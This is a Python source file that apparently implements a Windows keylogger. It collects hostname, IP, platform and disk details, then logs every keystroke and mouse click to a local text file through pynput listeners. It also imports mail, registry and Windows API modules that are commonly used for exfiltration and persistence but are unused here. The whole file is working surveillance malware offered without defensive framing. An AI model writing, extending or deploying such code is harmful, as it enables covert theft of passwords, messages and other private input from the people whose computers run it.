
import logging
import threading
from requests import get
import socket
from pynput.keyboard import Key, Listener
import sys
import time
import pynput.keyboard
import threading
import smtplib
import stat
import os
import shutil
import subprocess
import sys
import platform
import getpass
import winreg
import win32event, win32api, winerror
import sys
import threading
from pynput import mouse
from pynput import keyboard
import psutil


#log_dir=r"C:\Users\Mr. jarvis\Desktop\test/"
logging.basicConfig(filename=("key_log.text"),level =logging.DEBUG, format='%(asctime)s:%(message)s', datefmt='%d-%m %H:%M')


def system_information():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    hdd = psutil.disk_usage('/')
    
    logging.info('========Hostname==== :'+hostname+'=============')
    logging.info('========Ip========== :'+ip+'=============')
    logging.info('========Platform==== :'+plat+'=============')
    logging.info('========System====== :'+system+'=============')
    logging.info('========Machine===== :'+machine+'=============')
    logging.info('========HDD===== :'+str(hdd))

system_information()

def on_move(x, y):
    logging.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))


def on_press(key):
    if key == Key.space:
        key = " ------- "
    if key== Key.tab:
        key= '<TAB>'
    if key==Key.esc:
        key='Escape'
    if key==Key.enter:
        key= 'Enter'
    else:
        pass
    logging.info(str(key).replace("'", ""))

with mouse.Listener(on_click=on_click) as listener:
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()
